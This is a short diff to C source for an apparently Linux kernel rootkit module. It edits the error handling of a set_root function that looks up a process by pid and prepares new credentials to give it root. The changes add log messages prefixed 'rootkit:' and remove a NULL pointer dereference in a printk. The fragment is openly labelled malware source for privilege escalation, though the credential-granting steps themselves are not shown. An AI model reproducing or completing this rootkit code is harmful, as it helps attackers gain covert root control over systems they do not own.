@@ -18,8 +18,10 @@ void set_root(unsigned task_pid)
     struct task_struct *task;
     struct cred *root;
 
-    if(!proc_pid)
+    if(!proc_pid){
+        printk("rootkit: Failed to get pid.\n");
         return;
+    }
     
     task = pid_task(proc_pid, PIDTYPE_PID);
 
@@ -31,7 +33,7 @@ void set_root(unsigned task_pid)
     root = prepare_creds();
 
     if (root == NULL){
-        printk(KERN_ALERT "??NULL ==> %d", root->uid.val);
+        printk(KERN_ALERT "rootkit: Failed to get creds.\n");
         return;
     }
 
